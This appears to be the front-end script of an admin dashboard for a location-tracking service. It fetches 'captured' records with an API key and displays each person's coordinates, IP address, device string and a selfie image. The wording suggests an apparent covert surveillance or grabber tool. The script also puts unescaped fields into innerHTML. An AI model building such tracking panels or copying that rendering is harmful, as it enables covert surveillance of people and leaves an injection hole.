const API_URL = "https://location-tracker-api-cjka.onrender.com/locations";

const apiKeyInput = document.getElementById("apiKeyInput");
const loadBtn = document.getElementById("loadBtn");
const statusEl = document.getElementById("status");
const container = document.getElementById("locationsContainer");

function setStatus(msg, isError = false) {
    statusEl.textContent = msg;
    statusEl.style.color = isError ? "#ff6b6b" : "#888";
}

loadBtn.addEventListener("click", async () => {
    const apiKey = apiKeyInput.value.trim();
    
    if (!apiKey) {
        setStatus("Please enter your admin API key.", true);
        return;
    }

    loadBtn.disabled = true;
    setStatus("Loading locations...");

    try {
        const response = await fetch(API_URL, {
            headers: {
                "X-API-Key": apiKey
            }
        });

        const data = await response.json();

        if (!response.ok) {
            setStatus(`❌ ${data.message}`, true);
            loadBtn.disabled = false;
            return;
        }

        setStatus(`✅ Loaded ${data.count} location(s)`);
        renderLocations(data.locations);

    } catch (err) {
        console.error(err);
        setStatus("❌ Could not connect to server.", true);
    }

    loadBtn.disabled = false;
});

function renderLocations(locations) {
    container.innerHTML = "";

    if (locations.length === 0) {
        container.innerHTML = "<p style='text-align:center;color:#666;'>No locations captured yet.</p>";
        return;
    }

    // Reverse order so newest appears first
    locations.reverse().forEach(loc => {
        const card = document.createElement("div");
        card.className = "card";

        let photoHtml = "";
        if (loc.photo) {
            photoHtml = `<img src="data:image/jpeg;base64,${loc.photo}" alt="Selfie">`;
        } else {
            photoHtml = '<p class="no-selfie">📷 No selfie captured</p>';
        }

        const time = new Date(loc.timestamp).toLocaleString();

        card.innerHTML = `
            <div class="info-row">
                <span class="label">📍 Location:</span>
                <span class="value">${loc.latitude}, ${loc.longitude}</span>
            </div>
            <div class="info-row">
                <span class="label">🗺️ Maps:</span>
                <span class="value">
                    <a href="${loc.google_maps}" target="_blank" class="map-link">Open in Google Maps</a>
                </span>
            </div>
            <div class="info-row">
                <span class="label">📅 Time:</span>
                <span class="value">${time}</span>
            </div>
            <div class="info-row">
                <span class="label">🎯 Accuracy:</span>
                <span class="value">${loc.accuracy || 'N/A'} meters</span>
            </div>
            <div class="info-row">
                <span class="label">🌐 IP:</span>
                <span class="value">${loc.ip_address}</span>
            </div>
            <div class="info-row">
                <span class="label">📱 Device:</span>
                <span class="value">${loc.user_agent ? loc.user_agent.substring(0, 60) + '...' : 'N/A'}</span>
            </div>
            <hr style="border-color:#2a2a4a;margin:12px 0;">
            <div class="info-row">
                <span class="label">📸 Selfie:</span>
            </div>
            ${photoHtml}
        `;

        container.appendChild(card);
    });
}